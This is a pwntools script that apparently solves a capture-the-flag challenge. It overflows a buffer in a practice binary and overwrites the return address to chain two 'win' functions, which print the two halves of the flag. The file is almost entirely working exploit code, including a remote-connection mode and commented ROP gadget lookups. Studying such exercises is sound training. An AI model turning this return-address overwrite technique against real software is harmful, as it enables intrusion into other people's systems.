from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = find_offset(exe, cyclic(500))
win1 = elf.symbols['win_stage_1']
win2 = elf.symbols['win_stage_2']
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])


io = start()

payload = flat([
    b"A"*offset,
    win1,
    win2
])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
Desc: 
    Use ROP to trigger a two-stage win function!
Explanation:
    Lets explain the two win stages, the first stage will open and print the first half of the flag
    while the second stage prints the second half.

    No arguments need to be passed so this is a simple return address overwrite challenge (although two staged)
"""